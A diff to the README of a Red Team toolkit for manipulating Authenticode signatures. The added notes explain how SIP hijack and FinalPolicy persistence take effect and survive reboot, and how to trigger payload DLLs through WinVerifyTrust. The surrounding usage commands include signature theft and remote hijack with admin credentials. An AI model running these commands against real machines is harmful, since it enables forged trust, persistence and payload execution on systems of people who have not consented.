@@ -4,6 +4,8 @@ Authenticode signature manipulation toolkit for Red Team operations and security
 
 Available in Python (cross-platform) and C++ (Windows native).
 
+> **SIP and Trust Provider changes are cached per-process.** After running `hijack`, `sip-exec install`, or `clean`, you must start a **new process** to see the effect. Some operations (FinalPolicy, SIP hijack) survive reboot. Others (custom provider) require the calling application to use the registered GUID. If `signtool verify` still shows the old result, close it and open a new instance.
+
 ## Repository Structure
 
 ```
@@ -78,6 +80,8 @@ TrustMeBro.exe steal explorer.exe agent.exe --dry-run
 
 Install SIP or FinalPolicy persistence on the local machine. Requires admin.
 
+> **Changes take effect in new processes only.** Close and reopen any verification tool (signtool, PowerShell, Explorer) after running hijack. FinalPolicy and SIP hijack survive reboot.
+
 ```cmd
 :: SIP hijack (default: PE, PowerShell, MSI)
 TrustMeBro.exe hijack --sip-types PE,PowerShell,MSI
@@ -133,6 +137,8 @@ TrustMeBro.exe extract output.exe recovered.bin --camouflage
 
 Install, remove, or list payload DLLs on the SIP execution surface. Installed DLLs load in any process that calls WinVerifyTrust.
 
+> **The payload DLL loads in the next process that calls WinVerifyTrust.** Already-running processes will not load it until restarted. To force a trigger, open a new Explorer window or run `signtool verify` on any file.
+
 Named GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`
 
 ```cmd
@@ -178,6 +184,8 @@ Output:
 
 Remove all persistence artifacts. Requires at least one scope flag.
 
+> **Cleaned keys take effect in new processes.** Already-running processes retain the old cached values until restarted.
+
 ```cmd
 TrustMeBro.exe clean --sip                          :: Restore all SIP keys
 TrustMeBro.exe clean --finalpolicy                  :: Restore FinalPolicy
@@ -204,6 +212,7 @@ python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
 python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone
 
 # SIP hijack (remote via Impacket)
+# NOTE: target must log out and back in, or start a new process, to see changes
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types PE,VBScript,JScript
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types all
